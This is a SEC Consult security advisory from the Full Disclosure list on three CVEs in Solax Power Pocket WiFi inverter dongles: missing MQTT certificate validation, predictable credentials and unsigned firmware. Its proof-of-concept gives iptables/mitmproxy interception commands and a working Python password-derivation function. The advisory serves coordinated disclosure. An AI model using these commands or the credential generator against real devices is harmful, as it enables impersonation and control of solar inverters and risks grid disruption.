---
title: SEC Consult SA-20260212-0 :: Multiple Vulnerabilities in various Solax Power Pocket WiFi models
url: https://seclists.org/fulldisclosure/2026/Feb/17
source: Full Disclosure
date: 2026-02-16
fetch_date: 2026-02-17T04:21:55.031296
---

# SEC Consult SA-20260212-0 :: Multiple Vulnerabilities in various Solax Power Pocket WiFi models

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](16)
[By Date](date.html#17)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#17)
![Next](/images/right-icon-16x16.png)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20260212-0 :: Multiple Vulnerabilities in various Solax Power Pocket WiFi models

---

*From*: SEC Consult Vulnerability Lab via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 12 Feb 2026 10:53:04 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20260212-0 >
=======================================================================
              title: Multiple Vulnerabilities
            product: Various Solax Power Pocket WiFi models
 vulnerable version: See section below
      fixed version: See section below
         CVE number: CVE-2025-15573, CVE-2025-15574, CVE-2025-15575
             impact: High
           homepage:https://www.solaxpower.com
              found: 2025-04-15
                 by: Stefan Viehböck
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Atos business
                     Europe | Asia

                     https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"Founded in 2012, SolaX has rapidly risen to become a global leader in
photovoltaic energy storage systems and solutions. Leading the way in
industry innovation, SolaX introduced Asia’s first energy storage inverter
and has successfully launched five major product series over the years."

Source:https://www.solaxpower.com/about/

Business recommendation:
------------------------
The vendor provides patches for the affected Pocket models which can be
obtained throw their customers' Solax Cloud accounts and using the Pocket
firmware upgrade function there. They should be installed immediately if
the device is not already patched.

SEC Consult highly recommends to perform a thorough security review of the
product conducted by security professionals to identify and resolve potential
further security issues.

Vulnerability overview/description:
-----------------------------------
1) Missing Certificate Validation for SolaX Cloud MQTT Connection (CVE-2025-15573)
The device does not validate the server certificate when connecting to the
SolaX Cloud MQTTS server hosted in the Alibaba Cloud
(mqtt001.solaxcloud.com, TCP 8883). This allows attackers in a
man-in-the-middle position to act as the legitimate MQTT server and issuing
arbitrary commands to devices.

Large scale man-in-the-middle attacks are feasible for attackers with the
capabilities to execute attacks such as BGP hijacking, DNS spoofing or
intercepting communication at the backbone level (e.g. nation state).

Possible threats are:
- Disrupting the electric grid by repeatedly starting/stopping inverters.
- Getting initial access to the victim's local networks by flashing malicious
  firmware on the dongles.
- Causing physical damage by flashing malicious firmware on the inverters
  (disabling firmware-based safety checks + introducing malicious behavior like
  overvoltage, frequency mismatches, etc.).

2) Insecure Credential Generation for Solax Cloud MQTT Connection (CVE-2025-15574)
When connecting to the Solax Cloud MQTT server the username is the
"registration number", which is the 10 character string printed on the device /
the QR code on the device. The password is derived from the "registration
number" using a proprietary XOR/transposition algorithm.
Attackers with the knowledge of the registration numbers can connect to the
MQTT server and impersonate the dongle / inverters.

3) Missing Firmware Authenticity Checks (CVE-2025-15575)
The firmware update functionality does not verify the authenticity of the
supplied firmware update files. This allows attackers to flash malicious
firmware update files on the device.

Proof of concept:
-----------------
1) Missing Certificate Validation for SolaX Cloud MQTTS Connection (CVE-2025-15573)
The following commands can be used to intercept the communication between a device
and the Solax Cloud.

iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
iptables -t nat -A PREROUTING -i wlan0 -p tcp -m tcp --dport 8883 -j REDIRECT --to-ports 8080
mitmproxy --mode transparent --set connection_strategy=lazy --set tls_version_client_min=TLS1_2 --set
tls_version_server_min=TLS1_2 -k -v

2) Insecure Credential Generation for Solax Cloud MQTT Connection (CVE-2025-15574)
The following python script implements the password derivation given the
registration number:

python ```
import re

def generate_solax_password(registration_number):
    registration_number = bytearray(registration_number.encode())
    password = bytearray(8)

    password[0] = registration_number[7]
    password[1] = registration_number[4]
    password[2] = registration_number[3]
    password[3] = registration_number[6]
    password[4] = registration_number[5]
    password[5] = registration_number[2]
    password[6] = registration_number[9]
    password[7] = registration_number[8]

    for i in range(len(password)):

        xored = password[i] ^ 0xb
        if re.match(r'[A-Z0-9]', chr(xored)):
            password[i] = xored
        else:
            print('else case')
            password[i] = ord('A')

    return password.decode('ascii')

registration_number = "SM3XXXXXXX"
password = generate_solax_password(registration_number)
print(registration_number,password)
```

3) Missing Firmware Authenticity Checks (CVE-2025-15575)
No proof-of-concept is provided. Initial analysis of the firmware update
functionality does not show any cryptographic checks (e.g. digital signature
checks) on the supplied firmware update files.
Furthermore, ESP32 security features such as secure boot are not used.

Vulnerable / tested versions:
-----------------------------
The following version has been tested on a Solax Power Pocket WiFi V3:
* 618.00415.00_Pocket_WIFI_V3.015.02_20240122

It is likely that other SolaX / QCells products that directly connect to the
SolaX Cloud are affected. This includes inverter Wi-Fi/LAN/LTE dongles,
Adapter Box, EV Charger, etc.

The vendor provided the following further affected products:
1. Pocket WiFi 3.0
2. Pocket WiFi+LAN
3. Pocket WiFi+4GM
4. Pocket WiFi+LAN 2.0
5. Pocket WiFi 4.0

Vendor contact timeline:
------------------------
2025-05-05: Contacting vendor throughservice () solaxpower com; no response.
2025-05-16: Contacting vendor through multiple other email addresses from their
            website.
2025-05-20: Asking a direct contact at SolaX Power for a security contact.
2025-05-27: Vendor security team responds with PGP key.
2025-05-28: Sending encrypted advisory.
2025-06-09: Vendor responds with analysis of the issues and that
            a new firmware will be released by the end of July 2025.
2025-06-12: Asking a few follow-up questions, which other products are affected,
            and whether manual update is necessary or automatically pushed.
            No response.
2025-07-10: Asking vendor again & regarding patch availability. No response.
2026-02-09: Following up again, setting release date to 26th February, reserving
            CVE numbers.
2026-02-10: Vendor provides detailed model information with updated firmware versions.
            Setting disclosure date to...